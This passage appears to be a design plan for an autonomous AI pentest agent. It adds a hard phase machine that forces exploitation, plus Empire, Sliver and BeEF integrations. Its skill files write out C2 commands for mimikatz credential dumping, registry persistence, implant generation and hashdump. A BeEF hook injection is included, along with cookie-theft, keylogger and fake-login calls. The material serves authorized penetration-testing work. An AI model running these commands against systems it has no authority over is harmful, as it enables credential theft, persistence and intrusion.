   **Change 2: Add guidance drain at top of main iteration loop**
   ```python
   # At the top of each iteration in the while loop:
   messages = self.guidance.drain()
   formatted = self.guidance.format_for_injection(messages)
   if formatted:
       self.conversation.append({"role": "system", "content": formatted})
   ```

   **Change 3: Add stop signal check at top of main iteration loop**
   ```python
   if self._check_stop_signal():
       self._save_checkpoint()
       self.events.emit_task_complete("Stopped by user", self.phase_current, self.iteration)
       break
   ```

   **Change 4: Emit events around existing execution code**
   ```python
   # Before LLM call:
   self.events.emit_thinking(iteration=self.iteration, phase=self.phase_current, thought="Planning...")

   # Before command execution:
   self.events.emit_tool_start(tool_name=tool, command=content)

   # After command execution:
   self.events.emit_tool_complete(tool_name=tool, success=execution.exit_code == 0, output_summary=execution.stdout[:2000])
   ```

#### Frontend Files to Create:
1. `frontend/components/ChatInterface.tsx`
2. `frontend/components/ToolExecutionCard.tsx`
3. `frontend/components/PhaseProgressBar.tsx`

#### Testing Sprint 0:
1. Send `{"type": "guidance", "payload": {"message": "Focus on SMB"}}` via WebSocket → verify it appears in agent context
2. Send a natural language message via `POST /jobs/chat` → verify intent classification and job creation
3. Verify structured events stream to WebSocket during a pentest run
4. Test stop signal: send `{"type": "stop"}`, verify agent stops and checkpoint is saved
5. Verify guidance_ack is sent back to the client

---

### Sprint 1 (Week 2-3): Core Agent Loop Fixes

**Goal:** Fix the exploitation gap. Agent must stop scanning loops and start exploiting.

#### Files to Create:
1. `kali-executor/open-interpreter/project_settings.py` — Per-job settings system
2. `kali-executor/open-interpreter/phase_machine.py` — Hard phase state machine
3. `kali-executor/open-interpreter/tool_phase_map.py` — Tool→phase mapping for 125+ tools
4. `kali-executor/open-interpreter/tool_usage_tracker.py` — Usage tracking + diversity enforcement
5. `kali-executor/open-interpreter/exploitation_injector.py` — Proactive command injection

#### Files to Modify:
1. **`kali-executor/open-interpreter/dynamic_agent.py`** — Main integration

   **Change 1: Replace soft phase system with PhaseState**
   ```python
   # FIND (around line 370-440, in __init__):
   # Lines that set up: self.phase_current, self.phase_steps, self.phase_limits, etc.
   
   # REPLACE WITH:
   from phase_machine import PhaseState, Phase
   from tool_phase_map import DEFAULT_TOOL_PHASE_MAP, is_tool_allowed, get_blocked_reason
   from project_settings import load_settings_from_redis, get_setting
   from tool_usage_tracker import ToolUsageTracker
   from exploitation_injector import ExploitationInjector
   
   # In __init__:
   self.phase = PhaseState()
   self.tool_tracker = ToolUsageTracker(redis_client=getattr(self, 'redis_client', None), job_id=self.session_id)
   self.exploit_injector = ExploitationInjector()
   self.exploitation_plan_injected = False
   ```

   **Change 2: Add hard tool blocking before execution**
   ```python
   # FIND: _execute() method (line ~3462)
   # ADD at the beginning of _execute(), before the subprocess call:
   
   def _execute(self, exec_type: str, content: str, timeout: int = 120) -> Execution:
       # NEW: Hard phase gate
       tool = self._detect_tool(content)
       block_reason = get_blocked_reason(tool, self.phase.current.value)
       if block_reason:
           self._log(f"PHASE GATE BLOCKED: {tool} in {self.phase.current.value}", "WARN")
           return Execution(
               exec_type=exec_type,
               content=content,
               stdout="",
               stderr=block_reason,
               exit_code=1,
               timestamp=datetime.now(timezone.utc).isoformat(),
               iteration=self.iteration,
               tool=tool,
               phase=self.phase.current.value,
               success=False,
               error_message=block_reason,
           )
       # ... rest of existing _execute() ...
   ```

   **Change 3: Inject exploitation plan at phase transition**
   ```python
   # FIND: Where phase transitions happen (in _enforce_phase_gate_before_llm, around line 7384)
   # ADD: exploitation plan injection when entering EXPLOITATION phase
   
   if self.phase.current == Phase.EXPLOITATION and not self.exploitation_plan_injected:
       findings = [asdict(v) for v in self.vulns_found.values() if isinstance(v, dict)]
       plan = self.exploit_injector.generate_plan(findings, self.target)
       if plan:
           prompt = self.exploit_injector.format_injection_prompt(plan)
           self.conversation.append({"role": "system", "content": prompt})
           self.exploitation_plan_injected = True
   ```

   **Change 4: Add tool usage tracking after execution**
   ```python
   # FIND: _save_execution() method (line ~3603)
   # ADD at end:
   self.tool_tracker.record(execution.tool)
   ```

   **Change 5: Inject diversity prompt before LLM calls**
   ```python
   # FIND: The main loop where LLM is called (the while loop with self.llm.chat())
   # ADD before the LLM call:
   
   diversity_prompt = self.tool_tracker.build_diversity_prompt(
       self.iteration,
       [v.get('type', '') for v in self.vulns_found.values() if isinstance(v, dict)]
   )
   if diversity_prompt:
       self.conversation.append({"role": "system", "content": diversity_prompt})
   ```

#### Testing Sprint 1:
1. Run a pentest job against DVWA
2. Verify: nmap is BLOCKED after phase transitions to EXPLOITATION
3. Verify: exploitation plan is injected as system message
4. Verify: tool diversity prompt appears after 20+ iterations with <4 tools
5. Check Redis for `job:{id}:tool_usage` hash

---

### Sprint 2 (Week 4-5): Neo4j + Knowledge Graph

**Goal:** Add persistent knowledge graph that tracks attack surface and enables reasoning queries.

#### Files to Create:
1. `kali-executor/open-interpreter/knowledge_graph.py` — Neo4j client (as defined in Part 2C above)
2. `kali-executor/open-interpreter/graph_parsers.py` — Parse command output into graph nodes

#### Files to Modify:

1. **`docker-compose.yml`** — Add Neo4j container

   ```yaml
   # ADD under services:
     neo4j:
       image: neo4j:5.26-community
       container_name: tazosploit-neo4j
       environment:
         - NEO4J_AUTH=neo4j/${NEO4J_PASSWORD:-changeme123}
         - NEO4J_PLUGINS=["apoc"]
         - NEO4J_dbms_security_procedures_unrestricted=apoc.*
       ports:
         - "7474:7474"
         - "7687:7687"
       volumes:
         - neo4j-data:/data
       networks:
         - exec-net
         - control-net
       healthcheck:
         test: ["CMD", "wget", "-q", "--spider", "http://localhost:7474"]
         interval: 10s
         timeout: 5s
         retries: 5
       restart: unless-stopped
   
   # ADD under volumes:
     neo4j-data:
   ```

2. **`kali-executor/open-interpreter/dynamic_agent.py`**

   **Change 1: Initialize knowledge graph**
   ```python
   # In __init__, after Redis setup:
   from knowledge_graph import KnowledgeGraph
   self.kg = KnowledgeGraph(job_id=self.session_id)
   ```

   **Change 2: Parse nmap output into graph**
   ```python
   # NEW FILE: kali-executor/open-interpreter/graph_parsers.py
   """Parse command output into knowledge graph updates."""
   import re
   from typing import Optional
   
   def parse_nmap_output(output: str, kg, target: str = None):
       """Parse nmap output and add hosts/services to knowledge graph."""
       # Extract host
       host_match = re.search(r'Nmap scan report for (\S+)', output)
       if host_match:
           host = host_match.group(1)
           # Check if IP in parentheses
           ip_match = re.search(r'\((\d+\.\d+\.\d+\.\d+)\)', output)
           ip = ip_match.group(1) if ip_match else host
           hostname = host if host != ip else None
           kg.add_host(ip=ip, hostname=hostname)
           
           # Extract ports
           for m in re.finditer(r'(\d+)/(\w+)\s+open\s+(\S+)\s*(.*)', output):
               port, proto, service, version = m.groups()
               kg.add_service(
                   host_ip=ip,
                   port=int(port),
                   protocol=proto,
                   name=service,
                   version=version.strip() if version.strip() else None
               )
   
   def parse_nuclei_output(output: str, kg, target: str = None):
       """Parse nuclei output and add vulnerabilities to graph."""
       for line in output.split('\n'):
           # Nuclei format: [template-id] [severity] [protocol] URL [matched-at]
           m = re.match(r'\[([^\]]+)\]\s+\[(\w+)\]\s+\[(\w+)\]\s+(\S+)', line)
           if m:
               template_id, severity, proto, url = m.groups()
               # Extract host/port from URL
               from urllib.parse import urlparse
               parsed = urlparse(url)
               host = parsed.hostname or target
               port = parsed.port or (443 if parsed.scheme == 'https' else 80)
               kg.add_vulnerability(
                   host_ip=host, port=port,
                   vuln_type=template_id, severity=severity,
                   details=line.strip()
               )
   
   # Map tool names to parsers
   TOOL_PARSERS = {
       'nmap': parse_nmap_output,
       'nuclei': parse_nuclei_output,
       # Add more parsers as needed
   }
   
   def auto_parse(tool: str, output: str, kg, target: str = None):
       """Auto-detect tool and parse output into graph."""
       parser = TOOL_PARSERS.get(tool.lower())
       if parser:
           try:
               parser(output, kg, target)
           except Exception as e:
               import logging
               logging.getLogger(__name__).warning(f"Graph parse failed for {tool}: {e}")
   ```

   **Change 3: Auto-parse after execution**
   ```python
   # In _save_execution() or after execution completes:
   from graph_parsers import auto_parse
   if self.kg.available:
       auto_parse(execution.tool, execution.stdout, self.kg, self.target)
   ```

   **Change 4: Inject graph summary into LLM context**
   ```python
   # Before LLM call, add graph context:
   if self.kg.available and self.iteration % 5 == 0:  # Every 5 iterations
       summary = self.kg.get_attack_surface_summary()
       if summary and len(summary) > 50:
           self.conversation.append({
               "role": "system",
               "content": f"[KNOWLEDGE GRAPH UPDATE]\n{summary}"
           })
   ```

#### Testing Sprint 2:
1. Start docker-compose with neo4j container
2. Run nmap scan — verify Host/Service nodes created in Neo4j (browse http://localhost:7474)
3. Run nuclei scan — verify Vulnerability nodes linked to Services
4. Verify graph summary appears in LLM context
5. Check `get_unexploited_services()` returns correct results

---

### Sprint 3 (Week 6-7): Structured Output + Settings System

**Goal:** Structured TOON agent output with Pydantic validation. Full settings system with API. Approval gates and question system.

#### Files to Create:
1. `kali-executor/open-interpreter/structured_output.py` — AgentDecision model + parsing (as defined in Part 2B)
2. `kali-executor/open-interpreter/approval_gate.py` — Approval flow (as defined in Part 2E)

#### Files to Modify:

1. **`kali-executor/open-interpreter/dynamic_agent.py`**

   **Change 1: Add structured output prompt injection**
   ```python
   # In __init__:
   self.use_structured_output = get_setting('USE_STRUCTURED_OUTPUT', False)
   
   # In system prompt building:
   if self.use_structured_output:
       from structured_output import STRUCTURED_OUTPUT_PROMPT
       # Append to system prompt
       system_prompt += "\n\n" + STRUCTURED_OUTPUT_PROMPT
   ```

   **Change 2: Parse structured output from LLM response**
   ```python
   # After LLM response, replace _extract_executable() path:
   if self.use_structured_output:
       from structured_output import parse_agent_decision
       decision = parse_agent_decision(response_text)
       if decision and decision.command:
           executables = [(decision.command_type or 'bash', decision.command)]
           # Record thought/reasoning
           self._current_thought = decision.thought
           self._current_reasoning = decision.reasoning
           # Update todo
           self._update_todo_from_decision(decision)
       else:
           # Fallback to regex
           executables = self._extract_executable(response_text)
   else:
       executables = self._extract_executable(response_text)
   ```

   **Change 3: Approval gate integration**
   ```python
   # In _advance_phase():
   from approval_gate import ApprovalGate
   
   # In __init__:
   self.approval_gate = ApprovalGate(
       websocket=self.websocket,
       redis_client=getattr(self, 'redis_client', None),
       job_id=self.session_id
   )
   ```

2. **`control-plane/` (API server)** — Add settings endpoints

   ```python
   # NEW API endpoints (add to control-plane API):
   
   # GET /api/jobs/:id/settings — Get job settings
   # PUT /api/jobs/:id/settings — Update job settings
   # POST /api/jobs/:id/approve — Submit approval response
   
   # Settings stored in Redis: job:{id}:settings (JSON)
   # Approval stored in Redis: job:{id}:approval_response (JSON)
   ```

#### Testing Sprint 3:
1. Set `USE_STRUCTURED_OUTPUT=true` and run a job
2. Verify LLM outputs JSON matching AgentDecision schema
3. Verify fallback to regex when JSON parsing fails
4. Test approval gate: set `REQUIRE_APPROVAL_FOR_EXPLOITATION=true`
5. Verify agent pauses at phase transition
6. Submit approval via API/Redis and verify agent continues

---

### Sprint 4 (Week 8-10): UI + Polish

**Goal:** Full chat UI, approval modal, question cards, execution trace visualization, attack graph rendering.

#### Files to Modify:

1. **`frontend/`** — Add new UI components:
   - Model selector dropdown (per-job)
   - Phase indicator with progress bar
   - Tool usage heatmap
   - Attack surface graph visualization (D3.js + Neo4j data)
   - Approval gate UI (modal for approve/modify/abort)
   - Settings panel per-job
   - Execution trace viewer (structured steps with thought/tool/output)
   - Todo list sidebar

2. **`control-plane/`** — Add WebSocket message types:
   ```python
   # New message types:
   APPROVAL_REQUEST = "approval_request"
   QUESTION_REQUEST = "question_request"
   PHASE_UPDATE = "phase_update"
   TODO_UPDATE = "todo_update"
   EXECUTION_STEP = "execution_step"
   GRAPH_UPDATE = "graph_update"
   ```

3. **API endpoints for graph data:**
   ```python
   # GET /api/jobs/:id/graph — Get Neo4j graph data for visualization
   # GET /api/jobs/:id/trace — Get execution trace
   # GET /api/jobs/:id/todo — Get todo list
   ```

#### Testing Sprint 4:
1. UI model dropdown works and sets model in Redis
2. Phase indicator updates in real-time via WebSocket
3. Attack graph renders in browser from Neo4j data
4. Approval modal appears and sends response correctly

---

## 8. Appendix: File Reference Map

### New Files to Create

| # | Path | Purpose | Sprint |
|---|------|---------|--------|
| 1 | `kali-executor/open-interpreter/intent_classifier.py` | Natural language → job config | **0** |
| 2 | `kali-executor/open-interpreter/guidance_queue.py` | Redis-backed real-time guidance | **0** |
| 3 | `kali-executor/open-interpreter/event_emitter.py` | Structured event publisher | **0** |
| 4 | `kali-executor/open-interpreter/project_settings.py` | Per-job settings from Redis | 1 |
| 5 | `kali-executor/open-interpreter/phase_machine.py` | Hard phase state machine | 1 |
| 6 | `kali-executor/open-interpreter/tool_phase_map.py` | Tool→phase mapping | 1 |
| 7 | `kali-executor/open-interpreter/tool_usage_tracker.py` | Usage tracking + diversity | 1 |
| 8 | `kali-executor/open-interpreter/exploitation_injector.py` | Proactive exploit commands | 1 |
| 9 | `kali-executor/open-interpreter/knowledge_graph.py` | Neo4j client | 2 |
| 10 | `kali-executor/open-interpreter/graph_parsers.py` | Command output → graph | 2 |
| 11 | `kali-executor/open-interpreter/structured_output.py` | Pydantic agent output | 3 |
| 12 | `kali-executor/open-interpreter/approval_gate.py` | Phase approval system | 3 |
| 13 | `kali-executor/open-interpreter/model_router.py` | Smart model routing | 4 |
| 14 | `frontend/components/ChatInterface.tsx` | Main conversational UI | 0+4 |
| 15 | `frontend/components/ToolExecutionCard.tsx` | Tool execution display card | 0+4 |
| 16 | `frontend/components/ApprovalModal.tsx` | Approval gate dialog | 4 |
| 17 | `frontend/components/QuestionCard.tsx` | Agent question inline card | 4 |
| 18 | `frontend/components/PhaseProgressBar.tsx` | Phase progress indicator | 0+4 |
| 19 | `frontend/components/TodoSidebar.tsx` | Agent task list sidebar | 4 |
| 20 | `frontend/components/StopResumeButton.tsx` | Floating stop/resume control | 4 |

### Existing Files to Modify

| # | Path | Changes | Sprint |
|---|------|---------|--------|
| 1 | `kali-executor/open-interpreter/dynamic_agent.py` | Event emitter, guidance drain, stop/resume, phase system, tool blocking, KG, structured output, approval/question flows | 0-3 |
| 2 | `control-plane/api/routers/websocket.py` | Add `job_chat_websocket` bidirectional endpoint | 0 |
| 3 | `control-plane/api/routers/jobs.py` | Add `POST /jobs/chat` NL endpoint | 0 |
| 4 | `docker-compose.yml` | Add Neo4j container | 2 |
| 5 | `skills/skill_router.py` | Update to use tool_phase_map | 1 |
| 6 | `control-plane/` (API) | Settings + approval endpoints | 3-4 |
| 7 | `frontend/` (UI) | Full chat interface + all interactive components | 0+4 |

### RedAmon Reference Files

| Path | What We Took |
|------|-------------|
| `/tmp/redamon/agentic/project_settings.py` | Settings system pattern, all defaults |
| `/tmp/redamon/agentic/state.py` | Pydantic models (LLMDecision, ExecutionStep, TodoItem, etc.) |
| `/tmp/redamon/agentic/orchestrator_helpers/phase.py` | Phase transition logic |
| `/tmp/redamon/agentic/orchestrator_helpers/exploit_writer.py` | Exploit node writer with deterministic ID |
| `/tmp/redamon/agentic/tools.py` | Phase-aware tool management, tenant context vars |
| `/tmp/redamon/agentic/websocket_api.py` | Approval/question WebSocket protocol |
| `/tmp/redamon/graph_db/neo4j_client.py` | Schema design, CRUD patterns |
| `/tmp/redamon/graph_db/docker-compose.yml` | Neo4j container config |
| `/tmp/redamon/recon/project_settings.py` | Recon tool configuration patterns |

---

## 9. New Tool Integrations: Empire C2 + OWASP ZAP

### 9.1 PowerShell Empire + Starkiller (C2 Framework)

**What:** Post-exploitation C2 framework. Agents for Windows (PowerShell, fileless — no powershell.exe), Linux/macOS (Python 3). 400+ post-exploit modules. Built-in AV evasion. REST API for programmatic control.

**Why:** Directly addresses TazoSploit's #1 problem — the agent does recon/discovery but never transitions to real exploitation and post-exploitation. Empire provides the entire post-exploit toolkit: persistence, lateral movement, credential harvesting, privilege escalation, data exfiltration.

**Install in Kali Dockerfile:**
```dockerfile
# Add to kali-executor Dockerfile
RUN apt-get update && apt-get install -y powershell-empire starkiller
```

**Docker Compose addition:**
```yaml
# Empire runs as a service the agent can call via REST API
empire:
  image: bcsecurity/empire:latest
  container_name: tazosploit-empire
  ports:
    - "1337:1337"   # REST API
    - "5000:5000"   # Starkiller UI
  networks:
    - exec-net
  restart: unless-stopped
  command: ["server", "--restip", "0.0.0.0", "--restport", "1337"]
```

**REST API integration (agent calls these programmatically):**
```python
# NEW FILE: skills/empire_c2.yaml
name: empire_c2
display_name: "PowerShell Empire C2"
category: post_exploitation
phases: [EXPLOITATION, POST_EXPLOIT]
mitre_ids: [T1059.001, T1547, T1003, T1021, T1055, T1570]
description: |
  Command and Control framework with 400+ post-exploitation modules.
  Use Empire's REST API for: listener setup, stager generation, agent interaction,
  module execution (mimikatz, persistence, lateral movement).

# Agent workflow:
# 1. Start listener:    POST /api/v2/listeners  (type: http, port: 8080)
# 2. Generate stager:   POST /api/v2/stagers    (listener: http, type: windows/launcher_bat)
# 3. Deploy stager via initial access exploit (msfconsole, evil-winrm, etc.)
# 4. Wait for callback: GET  /api/v2/agents
# 5. Run modules:       POST /api/v2/agents/{name}/tasks (module: powershell/credentials/mimikatz/logonpasswords)
# 6. Get results:       GET  /api/v2/agents/{name}/tasks

commands:
  setup_listener: |
    curl -s -X POST http://empire:1337/api/v2/listeners \
      -H "Content-Type: application/json" \
      -d '{"name":"http_listener","template":"http","options":{"Host":"http://{LHOST}:8080","Port":"8080"}}'
  generate_stager: |
    curl -s -X POST http://empire:1337/api/v2/stagers \
      -H "Content-Type: application/json" \
      -d '{"template":"windows/launcher_bat","options":{"Listener":"http_listener"}}'
  list_agents: |
    curl -s http://empire:1337/api/v2/agents
  run_mimikatz: |
    curl -s -X POST http://empire:1337/api/v2/agents/{agent_name}/tasks \
      -H "Content-Type: application/json" \
      -d '{"module":"powershell/credentials/mimikatz/logonpasswords"}'
  run_persistence: |
    curl -s -X POST http://empire:1337/api/v2/agents/{agent_name}/tasks \
      -H "Content-Type: application/json" \
      -d '{"module":"powershell/persistence/elevated/registry"}'
```

**Integration in `dynamic_agent.py`:**
```python
# Add Empire helper to agent — detect when agent has initial access and suggest Empire
def _suggest_empire_c2(self) -> Optional[str]:
    """When agent gets a shell/session, suggest deploying Empire for post-exploit."""
    if self.phase_current in ['EXPLOITATION', 'POST_EXPLOIT']:
        if self._has_active_session():  # meterpreter, shell, evil-winrm
            return (
                "[EMPIRE C2 AVAILABLE] You have an active session. "
                "Deploy Empire for advanced post-exploitation:\n"
                "1. Start listener: curl -X POST http://empire:1337/api/v2/listeners ...\n"
                "2. Generate stager and upload to target\n"
                "3. Run modules: mimikatz, persistence, lateral movement\n"
                "Empire REST API docs: http://empire:1337/api/v2/docs"
            )
    return None
```

### 9.2 OWASP ZAP (Web App Scanner)

**What:** Open-source web application security scanner. Full REST API, headless mode, active/passive scanning, spider, fuzzer, API scanning. The automation-friendly alternative to Burp Suite.

**Why:** TazoSploit's agent uses nikto and nuclei for web scanning but doesn't do deep interactive web testing. ZAP provides: authenticated scanning, AJAX spidering, active scanning with 100+ scan rules, session management, anti-CSRF token handling — all controllable via REST API.

**Why NOT Burp Suite:** Burp Pro costs $449/year and is GUI/proxy-focused. Burp Community has no scanning or API. ZAP is free, has a full REST API, and runs headless in Docker — perfect for AI agent automation.

**Docker Compose addition:**
```yaml
zap:
  image: ghcr.io/zaproxy/zaproxy:stable
  container_name: tazosploit-zap
  ports:
    - "8090:8090"   # ZAP API
  networks:
    - exec-net
  command: ["zap.sh", "-daemon", "-host", "0.0.0.0", "-port", "8090",
            "-config", "api.disablekey=true",
            "-config", "api.addrs.addr.name=.*", "-config", "api.addrs.addr.regex=true"]
  restart: unless-stopped
```

**Skill file:**
```yaml
# NEW FILE: skills/owasp_zap.yaml
name: owasp_zap
display_name: "OWASP ZAP Web Scanner"
category: vuln_scanning
phases: [RECON, VULN_DISCOVERY, EXPLOITATION]
mitre_ids: [T1190, T1189, T1059.007]
description: |
  Automated web application security scanner with full REST API.
  Use ZAP for: spidering, active scanning, authenticated testing, API scanning.
  More powerful than nikto/nuclei for deep web app testing.

# Agent workflow:
# 1. Spider target:     GET  /JSON/spider/action/scan?url={target}
# 2. Wait for spider:   GET  /JSON/spider/view/status?scanId={id}
# 3. Active scan:       GET  /JSON/ascan/action/scan?url={target}
# 4. Wait for scan:     GET  /JSON/ascan/view/status?scanId={id}
# 5. Get alerts:        GET  /JSON/alert/view/alerts?baseurl={target}

commands:
  spider: |
    curl -s "http://zap:8090/JSON/spider/action/scan?url={TARGET_URL}&maxChildren=50"
  active_scan: |
    curl -s "http://zap:8090/JSON/ascan/action/scan?url={TARGET_URL}&recurse=true"
  get_scan_status: |
    curl -s "http://zap:8090/JSON/ascan/view/status?scanId={SCAN_ID}"
  get_alerts: |
    curl -s "http://zap:8090/JSON/alert/view/alerts?baseurl={TARGET_URL}&start=0&count=100"
  ajax_spider: |
    curl -s "http://zap:8090/JSON/ajaxSpider/action/scan?url={TARGET_URL}"
  get_alert_summary: |
    curl -s "http://zap:8090/JSON/alert/view/alertsSummary?baseurl={TARGET_URL}"
```

**Integration in `dynamic_agent.py`:**
```python
# ZAP integration — use for web targets when agent detects HTTP services
def _suggest_zap_scan(self, target_url: str) -> Optional[str]:
    """When agent finds HTTP services, suggest ZAP for deep web scanning."""
    if self.phase_current in ['RECON', 'VULN_DISCOVERY']:
        return (
            f"[ZAP SCANNER AVAILABLE] Deep web app scan for {target_url}:\n"
            "1. Spider: curl http://zap:8090/JSON/spider/action/scan?url={url}\n"
            "2. Active scan: curl http://zap:8090/JSON/ascan/action/scan?url={url}\n"
            "3. Get alerts: curl http://zap:8090/JSON/alert/view/alerts?baseurl={url}\n"
            "ZAP finds: SQLi, XSS, CSRF, path traversal, SSRF, auth bypass, and 100+ more"
        )
    return None
```

### 9.3 BeEF (Browser Exploitation Framework)

**What:** Client-side exploitation framework that hooks browsers via JavaScript (XSS). Once hooked: steal cookies/creds, keylog, webcam/mic access, port scan internal networks FROM the victim's browser, social engineering attacks, Metasploit integration. 100+ command modules. Full REST API.

**Why:** TazoSploit's agent finds XSS vulns constantly but only proves them with `alert(1)`. BeEF turns XSS into **real exploitation** — browser takeover, credential theft, internal network pivoting through the victim's browser. This is the missing link between "found XSS" and "exploited XSS."

**The kill chain BeEF enables:**
1. Agent finds XSS (via nuclei, ZAP, manual fuzzing)
2. Agent injects BeEF hook: `<script src="http://beef:3000/hook.js"></script>`
3. Browser gets hooked → BeEF controls it
4. Agent runs modules via REST API: steal cookies, keylog, fake login, port scan internal network
5. **Real exploitation evidence** — not just `alert(1)` but actual stolen creds, session tokens, internal network map

**Docker Compose addition:**
```yaml
beef:
  image: beefproject/beef:latest
  container_name: tazosploit-beef
  ports:
    - "3000:3000"   # UI + hook.js
    - "6789:6789"   # WebSocket
  networks:
    - exec-net
  environment:
    - BEEF_USER=beef
    - BEEF_PASSWD=beef123
  restart: unless-stopped
```

**Skill file:**
```yaml
# NEW FILE: skills/beef_browser.yaml
name: beef_browser
display_name: "BeEF Browser Exploitation"
category: exploitation
phases: [EXPLOITATION, POST_EXPLOIT]
mitre_ids: [T1189, T1185, T1557, T1056.004, T1059.007]
description: |
  Browser Exploitation Framework. Hooks browsers via XSS injection.
  Once hooked: steal cookies, keylog, webcam, port scan internal networks,
  social engineering, Metasploit integration. REST API for automation.

# Agent workflow:
# 1. Find XSS vuln (nuclei, ZAP, manual)
# 2. Inject hook:  <script src="http://{LHOST}:3000/hook.js"></script>
# 3. Auth to API:  POST /api/admin/login {"username":"beef","password":"beef123"}
# 4. List hooked:  GET  /api/hooks?token={token}
# 5. Run module:   POST /api/modules/{session}/{module_id}?token={token}
# 6. Get results:  GET  /api/modules/{session}/{module_id}/{cmd_id}?token={token}

commands:
  authenticate: |
    curl -s -X POST http://beef:3000/api/admin/login \
      -H "Content-Type: application/json" \
      -d '{"username":"beef","password":"beef123"}'
  list_hooked_browsers: |
    curl -s "http://beef:3000/api/hooks?token={TOKEN}"
  list_modules: |
    curl -s "http://beef:3000/api/modules?token={TOKEN}"
  steal_cookies: |
    curl -s -X POST "http://beef:3000/api/modules/{SESSION}/get_cookie/{MOD_ID}?token={TOKEN}"
  keylogger: |
    curl -s -X POST "http://beef:3000/api/modules/{SESSION}/event_logger/{MOD_ID}?token={TOKEN}"
  internal_port_scan: |
    curl -s -X POST "http://beef:3000/api/modules/{SESSION}/port_scanner/{MOD_ID}?token={TOKEN}" \
      -H "Content-Type: application/json" \
      -d '{"ipRange":"192.168.1.1-254","ports":"80,443,8080,22,3389,445"}'
  fake_login: |
    curl -s -X POST "http://beef:3000/api/modules/{SESSION}/pretty_theft/{MOD_ID}?token={TOKEN}"
  hook_script: |
    echo '<script src="http://{LHOST}:3000/hook.js"></script>'
```

**Integration in `dynamic_agent.py`:**
```python
# BeEF integration — when agent finds XSS, suggest BeEF hook injection
def _suggest_beef_hook(self, xss_finding: dict) -> Optional[str]:
    """When agent confirms XSS, suggest BeEF hook for real exploitation."""
    if self.phase_current in ['EXPLOITATION', 'POST_EXPLOIT']:
        url = xss_finding.get('url', '')
        param = xss_finding.get('parameter', '')
        return (
            f"[BeEF AVAILABLE] XSS confirmed at {url} (param: {param}).\n"
            "Escalate to browser takeover:\n"
            f"1. Inject hook: <script src='http://{{LHOST}}:3000/hook.js'></script>\n"
            "2. Auth: curl -X POST http://beef:3000/api/admin/login -d '{{\"username\":\"beef\",\"password\":\"beef123\"}}'\n"
            "3. List hooked browsers: curl http://beef:3000/api/hooks?token={{TOKEN}}\n"
            "4. Run modules: steal cookies, keylog, port scan internal network\n"
            "This turns XSS PoC into REAL exploitation evidence."
        )
    return None
```

### 9.4 Sliver C2 (Free Cobalt Strike Alternative)

**What:** Open-source C2 framework by BishopFox. Cross-platform implants (Windows/Linux/macOS), mTLS/WireGuard/HTTP(S)/DNS transports, multiplayer support, armory (extension system). The legitimate, free alternative to Cobalt Strike used by real red teams.

**Why:** Fills the same role as Cobalt Strike without the $3,500 license or legal risk of cracked software. More modern than Empire, actively maintained, built for operator teams. gRPC API for automation.

**Docker Compose addition:**
```yaml
sliver:
  image: bcsecurity/sliver:latest
  container_name: tazosploit-sliver
  ports:
    - "31337:31337"  # gRPC API
    - "8888:8888"    # HTTP C2
    - "443:443"      # HTTPS C2
  networks:
    - exec-net
  volumes:
    - sliver-data:/root/.sliver
  restart: unless-stopped
```

**Skill file:**
```yaml
# NEW FILE: skills/sliver_c2.yaml
name: sliver_c2
display_name: "Sliver C2 Framework"
category: post_exploitation
phases: [EXPLOITATION, POST_EXPLOIT]
mitre_ids: [T1071, T1573, T1059, T1547, T1003, T1021]
description: |
  Open-source C2 framework (BishopFox). Cross-platform implants,
  mTLS/WireGuard/HTTP(S)/DNS transports. Armory extensions.
  Free alternative to Cobalt Strike. gRPC API for automation.

commands:
  generate_implant: |
    sliver-client generate --mtls {LHOST} --os windows --arch amd64 --save /tmp/implant.exe
  start_listener: |
    sliver-client mtls --lhost 0.0.0.0 --lport 8888
  list_sessions: |
    sliver-client sessions
  interact: |
    sliver-client use {SESSION_ID}
  dump_hashes: |
    sliver-client hashdump
  screenshot: |
    sliver-client screenshot
```

### 9.6 Smart Tool Recommender (CRITICAL — Solves the Tool Selection Problem)

**The Problem:** TazoSploit has 129+ tools. The LLM agent consistently uses only ~8. Adding Empire, ZAP, BeEF, Sliver makes it 133+. Dumping all tools into the LLM context is like giving someone a 50-page menu — they order chicken tenders every time. The LLM needs a **curated short list** per situation, not the full catalog.

**The Solution: 3-Layer Funnel**

```
All 133+ tools
      │
      ▼
┌─────────────────┐
│ Layer 1: Phase   │  Phase gate filters ~30-40 tools allowed
│ Gate             │  (tool_phase_map.py — already defined)
└────────┬────────┘
         │  ~30-40 tools
         ▼
┌─────────────────┐
│ Layer 2: Context │  Analyzes target OS, services, vulns found,
│ Recommender      │  what's been tried → recommends TOP 3-5
│ (NEW MODULE)     │  tools for THIS specific moment
└────────┬────────┘
         │  3-5 tools
         ▼
┌─────────────────┐
│ Layer 3: Comfort │  Tracks usage per job. If agent keeps using
│ Zone Breaker     │  same tool → injects alternatives it hasn't
│ (tool_tracker)   │  tried yet from the recommended set
└────────┬────────┘
         │  Final recommendation
         ▼
    LLM Prompt
    (only sees 3-5 relevant tools, not 133)
```

**File: `kali-executor/open-interpreter/tool_recommender.py` (NEW)**

```python
"""
TazoSploit Smart Tool Recommender

Context-aware tool selection that narrows 133+ tools to 3-5 recommendations.
Analyzes: current phase, target OS, discovered services, found vulns,
previously used tools, and tool outcomes to recommend the BEST next tool.

This module sits between the skill router and the LLM prompt builder.
Input: current agent state (phase, findings, services, OS, history)
Output: ranked list of 3-5 tool recommendations with reasoning
"""
import logging
from typing import List, Dict, Optional, Tuple
from dataclasses import dataclass, field
from enum import Enum

logger = logging.getLogger(__name__)


class TargetOS(str, Enum):
    WINDOWS = "windows"
    LINUX = "linux"
    MACOS = "macos"
    UNKNOWN = "unknown"


class ServiceType(str, Enum):
    HTTP = "http"
    HTTPS = "https"
    SSH = "ssh"
    SMB = "smb"
    RDP = "rdp"
    FTP = "ftp"
    SMTP = "smtp"
    DNS = "dns"
    MSSQL = "mssql"
    MYSQL = "mysql"
    POSTGRES = "postgres"
    LDAP = "ldap"
    WINRM = "winrm"
    SNMP = "snmp"
    TELNET = "telnet"
    VNC = "vnc"


class VulnType(str, Enum):
    XSS = "xss"
    SQLI = "sqli"
    RCE = "rce"
    LFI = "lfi"
    RFI = "rfi"
    SSRF = "ssrf"
    IDOR = "idor"
    AUTH_BYPASS = "auth_bypass"
    WEAK_CREDS = "weak_creds"
    DEFAULT_CREDS = "default_creds"
    MISCONFIG = "misconfig"
    CVE = "cve"
    PRIVESC = "privesc"
    INFO_DISCLOSURE = "info_disclosure"


@dataclass
class AgentContext:
    """Current state of the agent used for tool recommendation."""
